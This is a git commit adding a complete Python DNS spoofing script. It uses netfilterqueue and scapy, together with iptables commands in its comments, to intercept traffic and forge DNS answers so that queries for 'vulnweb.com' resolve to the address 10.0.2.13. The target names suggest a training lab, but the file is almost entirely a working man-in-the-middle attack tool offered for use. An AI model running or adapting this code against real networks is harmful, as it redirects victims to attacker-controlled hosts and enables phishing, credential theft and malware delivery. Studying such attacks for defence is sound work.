40d7374e3ece6dce1c4a66765104e3ede60316e8
Robert Paruch <roobbb@live.com>
2020-07-01 01:34:09 -0700

    Create dns_spoof.py

---
+++ dns_spoof/dns_spoof.py
@@ -0,0 +1,35 @@
+# Targeting a remote computer
+# iptables -I FORWARD -j NFQUEUE --queue-num 0
+# iptables --flush
+
+# Testing on the local computer
+# iptables -I OUTPUT -j NFQUEUE --queue-num 0
+# iptables -I INPUT -j NFQUEUE --queue-num 0
+# iptables --flush
+
+
+import netfilterqueue
+import scapy.all as sc
+
+
+def process_packet(packet):
+    scapy_packet = sc.IP(packet.get_payload())
+    if scapy_packet.haslayer(sc.DNSRR):
+        qname = scapy_packet[sc.DNSQR].qname
+        if bytes('vulnweb.com', 'utf-8') in qname:
+            print(f'[+] Spoofing target > {qname}')
+            answer = sc.DNSRR(rrname=qname, rdata='10.0.2.13')
+            scapy_packet[sc.DNS].an = answer
+            scapy_packet[sc.DNS].ancount = 1
+            del scapy_packet[sc.IP].len
+            del scapy_packet[sc.IP].chksum
+            del scapy_packet[sc.UDP].len
+            del scapy_packet[sc.UDP].chksum
+            packet.set_payload(bytes(scapy_packet))
+
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
